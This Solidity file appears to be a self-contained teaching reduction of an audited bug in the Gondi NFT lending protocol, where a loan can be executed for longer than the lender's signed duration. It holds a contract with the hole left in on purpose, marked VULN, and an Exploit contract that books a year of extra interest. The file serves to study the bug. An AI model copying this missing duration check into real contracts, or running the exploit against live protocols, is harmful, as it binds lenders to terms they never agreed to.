// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gondi — execution duration is not bounded by the signed offer (Code4rena 2024-04, H-13, #35215).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: _validateOfferExecution only rejects offer.duration == 0. The loan is stored
    with executionData.duration, and max interest is computed on that longer term.
    A 365-day signature is filled for 730 days. Extra interest is 100 WETH.
    The blamed use of the unbounded duration is preserved below (@> VULN).

    Repo: code-423n4/2024-04-gondi @ b9863d73c08fcdd2337dc80a8b5e0917e18b036c
    MultiSourceLoan._validateOfferExecution / _processOffersFromExecutionData. */

library Terms {
    uint256 internal constant PRINCIPAL = 1000 ether;
    uint256 internal constant APR = 1_000;
    uint256 internal constant BPS = 10_000;
    uint256 internal constant YEAR = 365 days;
    uint256 internal constant SIGNED = 365 days;
    uint256 internal constant EXECUTED = 730 days;
    uint256 internal constant SIGNED_INTEREST = 100 ether;
    uint256 internal constant ACTUAL_INTEREST = 200 ether;
    uint256 internal constant EXTRA = 100 ether;
    uint256 internal constant OFFER_ID = 7;
    uint256 internal constant TOKEN_ID = 42;
    uint256 internal constant EXPIRY = 4_000_000_000;
    address internal constant LENDER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    address internal constant COLLECTION = 0x000000000000000000000000000000000000C0C0;
}

contract PrincipalToken {
    string public name = "Wrapped Ether";
    string public symbol = "WETH";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mintAndApprove(address holder, address spender, uint256 amount) external {
        balanceOf[holder] += amount;
        totalSupply += amount;
        allowance[holder][spender] = amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MultiSourceLoan {
    bytes32 internal constant LOAN_OFFER_HASH =
        0xa87df46e2d2684eb0bbc7abfb05483167cdccac6d7302078a9eaad540c119958;

    struct LoanOffer {
        uint256 offerId;
        address lender;
        uint256 fee;
        uint256 capacity;
        address nftCollateralAddress;
        uint256 nftCollateralTokenId;
        address principalAddress;
        uint256 principalAmount;
        uint256 aprBps;
        uint256 expirationTime;
        uint256 duration;
        uint256 maxSeniorRepayment;
    }

    PrincipalToken public immutable token;
    uint256 public storedDuration;
    uint256 public signedDuration;
    uint256 public extraInterest;
    uint256 public bookedMaxInterest;
    address public borrower;

    constructor(PrincipalToken _token) {
        token = _token;
    }

    function DOMAIN_SEPARATOR() public view returns (bytes32) {
        return keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("GONDI_MULTI_SOURCE_LOAN")),
                keccak256(bytes("3")),
                block.chainid,
                address(this)
            )
        );
    }

    function hashOffer(LoanOffer memory offer) public pure returns (bytes32) {
        return keccak256(
            abi.encode(
                LOAN_OFFER_HASH,
                offer.offerId,
                offer.lender,
                offer.fee,
                offer.capacity,
                offer.nftCollateralAddress,
                offer.nftCollateralTokenId,
                offer.principalAddress,
                offer.principalAmount,
                offer.aprBps,
                offer.expirationTime,
                offer.duration,
                offer.maxSeniorRepayment,
                keccak256(bytes(""))
            )
        );
    }

    function digest(LoanOffer memory offer) public view returns (bytes32) {
        return keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), hashOffer(offer)));
    }

    /// Audited Interest.getInterest. Exact for these inputs, same result as mulDivUp.
    function getInterest(uint256 amount, uint256 aprBps, uint256 duration) public pure returns (uint256) {
        return amount * aprBps * duration / (Terms.BPS * Terms.YEAR);
    }

    function previewOffer() public view returns (LoanOffer memory offer) {
        offer = LoanOffer({
            offerId: Terms.OFFER_ID,
            lender: Terms.LENDER,
            fee: 0,
            capacity: 0,
            nftCollateralAddress: Terms.COLLECTION,
            nftCollateralTokenId: Terms.TOKEN_ID,
            principalAddress: address(token),
            principalAmount: Terms.PRINCIPAL,
            aprBps: Terms.APR,
            expirationTime: Terms.EXPIRY,
            duration: Terms.SIGNED,
            maxSeniorRepayment: 0
        });
    }

    function checkSignature(address signer, bytes32 structHash, bytes calldata signature) public view {
        require(signature.length == 65, "sig len");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := calldataload(signature.offset)
            s := calldataload(add(signature.offset, 32))
            v := byte(0, calldataload(add(signature.offset, 64)))
        }
        bytes32 typed = keccak256(abi.encodePacked(hex"1901", DOMAIN_SEPARATOR(), structHash));
        address recovered = ecrecover(typed, v, r, s);
        require(recovered == signer && recovered != address(0), "sig");
    }

    /// Audited _validateOfferExecution duration check, and nothing else on duration.
    function _validateOfferExecution(LoanOffer calldata offer, bytes calldata signature) private view {
        this.checkSignature(offer.lender, hashOffer(offer), signature);
        require(block.timestamp <= offer.expirationTime, "offer expired");
        if (offer.duration == 0) {
            revert("zero duration");
        }
        if (offer.aprBps == 0) {
            revert("zero interest");
        }
        require(offer.principalAddress == address(token), "token");
    }

    function emitLoan(LoanOffer calldata offer, uint256 executionDuration, bytes calldata signature) external {
        _validateOfferExecution(offer, signature);
        uint256 amount = offer.principalAmount;
        // @> VULN: executionDuration is not required to be <= offer.duration
        uint256 booked = amount + getInterest(amount, offer.aprBps, executionDuration);
        // FIX: require(executionDuration <= offer.duration) before this interest is booked.

        borrower = msg.sender;
        storedDuration = executionDuration;
        signedDuration = offer.duration;
        bookedMaxInterest = booked;
        uint256 signedInterest = getInterest(amount, offer.aprBps, offer.duration);
        uint256 actualInterest = getInterest(amount, offer.aprBps, executionDuration);
        extraInterest = actualInterest - signedInterest;

        token.transferFrom(offer.lender, msg.sender, amount - offer.fee);
        token.transferFrom(msg.sender, address(this), extraInterest);
    }
}

contract Exploit {
    // Lender 0xf39F… over the 365-day offer at the loan CREATE address, chain id 1.
    bytes constant LENDER_SIG =
        hex"5c010873cb4ad5e21b94371d09bc9384a874994c4764038511f93759b90447c401e77fb8bb4e0f72642243067b47e9526d0182131e7d506901e285cade4b9ca01b";

    PrincipalToken public token; // CREATE nonce 1
    MultiSourceLoan public loan; // CREATE nonce 2

    constructor() {
        token = new PrincipalToken();
        loan = new MultiSourceLoan(token);
    }

    function lenderSignature() external pure returns (bytes memory) {
        return LENDER_SIG;
    }

    function run() external {
        token.mintAndApprove(Terms.LENDER, address(loan), Terms.PRINCIPAL);
        token.approve(address(loan), type(uint256).max);

        MultiSourceLoan.LoanOffer memory offer = loan.previewOffer();
        require(offer.duration == Terms.SIGNED, "signed term");
        loan.emitLoan(offer, Terms.EXECUTED, LENDER_SIG);

        require(loan.storedDuration() == Terms.EXECUTED, "stored");
        require(loan.signedDuration() == Terms.SIGNED, "signed");
        require(loan.storedDuration() == loan.signedDuration() + Terms.YEAR, "one year longer");
        require(loan.extraInterest() == Terms.EXTRA, "extra");
        require(token.balanceOf(address(loan)) == Terms.EXTRA, "escrow");
        require(loan.bookedMaxInterest() == Terms.PRINCIPAL + Terms.ACTUAL_INTEREST, "booked");
        require(loan.borrower() == address(this), "borrower");
    }
}
